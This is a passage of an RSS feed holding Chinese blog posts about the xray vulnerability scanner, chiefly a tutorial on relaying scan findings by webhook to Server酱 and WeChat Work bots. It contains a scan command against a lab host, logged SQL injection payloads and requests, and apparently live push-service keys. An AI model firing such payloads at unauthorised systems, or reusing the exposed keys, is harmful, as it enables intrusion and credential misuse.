class=&quot;visible&quot;&gt;github.com/google/marti&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;an&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/u&gt;&lt;/blockquote&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2019-09-16-82711934</guid>
<pubDate>Mon, 16 Sep 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>对接 xray 和微信/企业微信实现自动告警</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-09-16-82705863.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/82705863&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9d63afb975b5674543a7d68f2f83c41d_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;xray 是什么&lt;/h2&gt;&lt;p&gt;xray 是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持 Windows / macOS / Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。&lt;/p&gt;&lt;h2&gt;如何第一时间知道扫出了漏洞&lt;/h2&gt;&lt;p&gt;对于安全工程师来说，扫描器发现了漏洞能第一时间给出告警是非常重要的，因为安全工程师使用的是 xray 的基础爬虫模式，爬虫一直在爬也不会一直人工刷新和查看漏洞报告，也有可能是使用的被动代理模式，让测试人员挂扫描器代理然后访问各个业务页面，但是不知道什么时间测试人员才开始和完成测试，也有可能是日志扫描模式，导入日志使用脚本进行 url 扫描，不知道什么时间才能重放完成。&lt;/p&gt;&lt;p&gt;还有很多公司自建了漏洞管理系统、工单系统等等，如果扫描器发现了漏洞可以自动同步这些系统也将会大大解放安全人员。针对这些场景 xray 有一种漏洞输出模式叫 &lt;code&gt;webhook-output&lt;/code&gt;，在发现漏洞的时候，将会向指定的 url post 漏洞数据，demo 的代码就是 &lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;webhook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vuln_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果我们写一个中间的转换和转发层，就可以很方便的实现下面的功能了&lt;/p&gt;&lt;ul&gt;&lt;li&gt;发送邮件、短信告警&lt;/li&gt;&lt;li&gt;发送微信、企业微信、钉钉、slack告警&lt;/li&gt;&lt;li&gt;漏洞信息同步到自己的数据库中&lt;/li&gt;&lt;li&gt;为该漏洞创建一个工单&lt;/li&gt;&lt;li&gt;使用其他的工具去验证漏洞是否存在&lt;/li&gt;&lt;li&gt;…… &lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;使用 webhook 做自动推送&lt;/h2&gt;&lt;p&gt;本文就借助 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//sc.ftqq.com/3.version&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Server酱&lt;/a&gt; 和&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//work.weixin.qq.com/help%3Fperson_id%3D1%26doc_id%3D13376&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;企业微信机器人&lt;/a&gt;，来演示如何实时通知 xray 发现了漏洞。&lt;/p&gt;&lt;h2&gt;xray 的 webhook 是什么&lt;/h2&gt;&lt;p&gt;对于 xray，webhook 应该是一个 url 地址，也就是我们需要自己搭建一个 web 服务器，接收到 xray 发送的漏洞信息，然后在将它转发，借助于 Python 的 flask 框架，我们很快写了一个 webhook url 的 demo 出来。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;from flask import Flask, request
import requests

app = Flask(__name__)

@app.route(&amp;#39;/webhook&amp;#39;, methods=[&amp;#39;POST&amp;#39;])
def xray_webhook():
    print(request.json)
    return &amp;#39;ok&amp;#39;

if __name__ == &amp;#39;__main__&amp;#39;:
    app.run()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用 &lt;code&gt;xray webscan --url http://pentester-web.vulnet/sqli/example1.php?name=root --plugins sqldet --webhook-output http://127.0.0.1:5000/webhook&lt;/code&gt; 测试，然后发现成功打印出了漏洞信息。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt; &lt;span class=&quot;p&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Serving&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;app.py&amp;#34;&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Environment&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;development&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Debug&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;off&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Running&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;5000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Press&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CTRL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;create_time&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;1566836256580&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;detail&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;host&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;pentester-web.vulnet&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;param&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;key&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;position&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;query&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;root&amp;#39;and&amp;#39;lW&amp;#39;=&amp;#39;lql&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;root&amp;#39;and&amp;#39;lW&amp;#39;=&amp;#39;lql&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;port&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;request&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;request1&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /sqli/example1.php?name=root%27and%274w%27%3D%274w HTTP/1.1\r\nHost: pentester-web.vulnet\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169\r\nCookie: key=value\r\nAccept-Encoding: gzip\r\n\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;request2&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /sqli/example1.php?name=root%27and%27lW%27%3D%27lql HTTP/1.1\r\nHost: pentester-web.vulnet\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169\r\nCookie: key=value\r\nAccept-Encoding: gzip\r\n\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;response&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;response1&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP/1.1 200 OK\r\n...&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;response2&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP/1.1 200 OK\r\n...&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;Generic Boolean based case [&amp;#39;string&amp;#39;]&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;boolean_based&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;http://pentester-web.vulnet/sqli/example1.php?name=root&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;plugin&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;sqldet&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;target&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;http://pentester-web.vulnet/sqli/example1.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;params&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;position&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;query&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}]},&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;vuln_class&amp;#39;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Aug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;2019&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;POST /webhook HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来就是解析 xray 的漏洞信息，然后生成对应的页面模板就好了。需要参考 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chaitin.github.io/xray/%23/guide/vuln&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chaitin.github.io/xray/#&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/guide/vuln&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; 的文档。因为推送不适合发送太大的数据量，所以就选择了基础的一些字段。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;from flask import Flask, request
import requests

app = Flask(__name__)


@app.route(&amp;#39;/webhook&amp;#39;, methods=[&amp;#39;POST&amp;#39;])
def xray_webhook():
    vuln = request.json
    content = &amp;#34;&amp;#34;&amp;#34;## xray 发现了新漏洞
    
url: {url}

插件: {plugin}

漏洞类型: {vuln_class}

发现时间: {create_time}

请及时查看和处理
&amp;#34;&amp;#34;&amp;#34;.format(url=vuln[&amp;#34;target&amp;#34;][&amp;#34;url&amp;#34;], plugin=vuln[&amp;#34;plugin&amp;#34;],
           vuln_class=vuln[&amp;#34;vuln_class&amp;#34;] or &amp;#34;Default&amp;#34;,
           create_time=str(datetime.datetime.fromtimestamp(vuln[&amp;#34;create_time&amp;#34;] / 1000)))
    print(content)
    return &amp;#39;ok&amp;#39;

if __name__ == &amp;#39;__main__&amp;#39;:
    app.run()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;Server 酱&lt;/h3&gt;&lt;p&gt;Server酱是一款程序员和服务器之间的通信软件，也就是从服务器推报警和日志到手机的工具。&lt;/p&gt;&lt;p&gt;开通并使用上它还是很简单的&lt;/p&gt;&lt;ul&gt;&lt;li&gt;登入：用 GitHub 账号登录 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//sc.ftqq.com/3.version&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;sc.ftqq.com/3.version&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;，就能获得一个 SECKEY &lt;/li&gt;&lt;li&gt;绑定：扫码关注完成绑定&lt;/li&gt;&lt;li&gt;发消息：往 &lt;code&gt;http://sc.ftqq.com/{SECKEY}.send&lt;/code&gt; 发请求，就可以在微信里收到消息啦&lt;br/&gt;我们先用 Python 写一个简单的 demo，以下所有的 SECKEY 的实际值我都使用 &lt;code&gt;{SECKEY}&lt;/code&gt; 代替，大家需要修改为自己的值。&lt;/li&gt;&lt;/ul&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;import requests
requests.post(&amp;#34;https://sc.ftqq.com/{SECKEY}.send&amp;#34;, 
              data={&amp;#34;text&amp;#34;: &amp;#34;xray vuln alarm&amp;#34;, &amp;#34;desp&amp;#34;: &amp;#34;test content&amp;#34;})&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很简单就收到了消息，将上面 xray 的漏洞信息结合在一起，就是&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;from flask import Flask, request
import requests
import datetime
import logging

app = Flask(__name__)


def push_ftqq(content):
    resp = requests.post(&amp;#34;https://sc.ftqq.com/SCU645T57f2913b7c0fc69372e997031f7cc4e0561b7f85f2b3d.send&amp;#34;,
                  data={&amp;#34;text&amp;#34;: &amp;#34;xray vuln alarm&amp;#34;, &amp;#34;desp&amp;#34;: content})
    if resp.json()[&amp;#34;errno&amp;#34;] != 0:
        raise ValueError(&amp;#34;push ftqq failed, %s&amp;#34; % resp.text)

@app.route(&amp;#39;/webhook&amp;#39;, methods=[&amp;#39;POST&amp;#39;])
def xray_webhook():
    vuln = request.json
    content = &amp;#34;&amp;#34;&amp;#34;## xray 发现了新漏洞
    
url: {url}

插件: {plugin}

漏洞类型: {vuln_class}

发现时间: {create_time}

请及时查看和处理
&amp;#34;&amp;#34;&amp;#34;.format(url=vuln[&amp;#34;target&amp;#34;][&amp;#34;url&amp;#34;], plugin=vuln[&amp;#34;plugin&amp;#34;],
           vuln_class=vuln[&amp;#34;vuln_class&amp;#34;] or &amp;#34;Default&amp;#34;,
           create_time=str(datetime.datetime.fromtimestamp(vuln[&amp;#34;create_time&amp;#34;] / 1000)))
    try:
        push_ftqq(content)
    except Exception as e:
        logging.exception(e)
    return &amp;#39;ok&amp;#39;


if __name__ == &amp;#39;__main__&amp;#39;:
    app.run()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;展示效果如图&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b97c0a05bb75832e8b8d1e0d0f1fbe0a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;750&quot; data-rawheight=&quot;1334&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;750&quot; data-original=&quot;https://pic3.zhimg.com/v2-b97c0a05bb75832e8b8d1e0d0f1fbe0a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b97c0a05bb75832e8b8d1e0d0f1fbe0a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;750&quot; data-rawheight=&quot;1334&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;750&quot; data-original=&quot;https://pic3.zhimg.com/v2-b97c0a05bb75832e8b8d1e0d0f1fbe0a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-b97c0a05bb75832e8b8d1e0d0f1fbe0a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;企业微信群机器人&lt;/p&gt;&lt;p&gt;企业微信群机器人就像一个普通成员一样，可以发言，可以 &lt;code&gt;@&lt;/code&gt; 人，如果我们接入企业微信群做 xray 的漏洞告警，也会大大方便漏洞的第一时间发现。&lt;/p&gt;&lt;p&gt;开通和使用方法&lt;/p&gt;&lt;ul&gt;&lt;li&gt;点击群聊右上角，然后找到 ‘群机器人’，然后点击’添加’&lt;/li&gt;&lt;li&gt;复制 Webhook 的地址，保存备用&lt;/li&gt;&lt;/ul&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-7afbdfbeb67a82d6f26a1356de7a150b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;750&quot; data-rawheight=&quot;1334&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;750&quot; data-original=&quot;https://pic4.zhimg.com/v2-7afbdfbeb67a82d6f26a1356de7a150b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-7afbdfbeb67a82d6f26a1356de7a150b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;750&quot; data-rawheight=&quot;1334&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;750&quot; data-original=&quot;https://pic4.zhimg.com/v2-7afbdfbeb67a82d6f26a1356de7a150b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-7afbdfbeb67a82d6f26a1356de7a150b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;调用的代码也非常简单，我们只需要展示主要的部分就可以了&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;def push_wechat_group(content):
    resp = requests.post(&amp;#34;https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=9651234b-f90e-4064-80fd-0a69d6c1d867&amp;#34;,
                         json={&amp;#34;msgtype&amp;#34;: &amp;#34;markdown&amp;#34;,
                               &amp;#34;markdown&amp;#34;: {&amp;#34;content&amp;#34;: content}})
    if resp.json()[&amp;#34;errno&amp;#34;] != 0:
        raise ValueError(&amp;#34;push wechat group failed, %s&amp;#34; % resp.text)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;展示效果如图&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d12f412f89bccf6a4ab44db873a8a156_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;291&quot; data-rawheight=&quot;161&quot; class=&quot;content_image&quot; width=&quot;291&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d12f412f89bccf6a4ab44db873a8a156_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;291&quot; data-rawheight=&quot;161&quot; class=&quot;content_image lazy&quot; width=&quot;291&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-d12f412f89bccf6a4ab44db873a8a156_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2019-09-16-82705863</guid>
<pubDate>Mon, 16 Sep 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>如何编写一个xray POC</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-08-15-78334648.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/78334648&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-851afedd29674e61be25747658ea0e49_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;xray是一款功能强大的安全评估工具，其支持开发者自定义POC。和传统的POC不同的是，xray的开发者可以通过YAML的方式来编写POC规则，十分方便。&lt;/p&gt;&lt;h2&gt;为什么要使用YAML编写POC&lt;/h2&gt;&lt;p&gt;有的同学提出了这样一个问题：其他框架都可以简单地用Python来编写POC，为什么xray要使用YAML呢？&lt;/p&gt;&lt;p&gt;我们使用YAML的考虑有如下几点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;xray本身由golang开发，如果插件也使用golang开发，对于开发者要求过高&lt;/li&gt;&lt;li&gt;xray核心源码未开源，使用编写代码的方式编写POC会给第三方开发者带来极大不便&lt;/li&gt;&lt;li&gt;golang本身没有特别方便的插件机制，通过命令行调用python存在效率问题，所以暂时不支持使用python开发POC&lt;/li&gt;&lt;li&gt;通过独创的表达式判断方法，即给予了POC很大的自由性，同时也使效率接近于golang原生代码&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;同样，相比于很多其他框架使用JSON来编写POC，xray使用YAML编写的POC又具有如下优势：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;YAML的值无需使用引号包裹，所以特殊字符无需转义&lt;/li&gt;&lt;li&gt;YAML的内容结构更加可读&lt;/li&gt;&lt;li&gt;YAML中可以使用注释&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;但考虑到YAML方式的确无法覆盖全部情况，之后也会考虑增加自定义Python POC开发，使用grpc的方式调用。&lt;/p&gt;&lt;p&gt;那么，本文先来介绍一下如何使用YAML来编写xray 